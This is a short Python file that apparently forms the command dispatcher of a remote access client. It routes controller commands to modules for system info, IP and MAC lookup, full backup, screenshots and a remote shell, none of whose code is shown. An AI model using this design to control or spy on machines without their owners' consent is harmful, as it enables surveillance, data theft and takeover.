import functions.commands.get_sys_info as get_sys_info
import functions.commands.get_client_ip as get_client_ip
import functions.commands.get_client_mac as get_client_mac
import functions.commands.backup_all as backup_all
import functions.commands.get_screenshot as get_screenshot
import functions.commands.remote_shell as remote_shell


def handle(cmd):
    if cmd == "ping":
            return False
    if "ping" in cmd:
        cmd = cmd.replace("ping", "")
    print(cmd)

    if cmd == "get_client_system_infos":
        return get_sys_info.getSystemInfo()

    if cmd == "get_client_ip":
        return get_client_ip.getClientIp()
    
    if cmd == "get_client_mac":
        return get_client_mac.getClientMac()

    if cmd == "backup_all":
        return backup_all.backupAll()

    if cmd == "get_client_screenshot":
        return get_screenshot.getScreenshot()

    if "/cmd/" in cmd:
        return remote_shell.remoteShell(cmd)

    return "Inavlid Command!"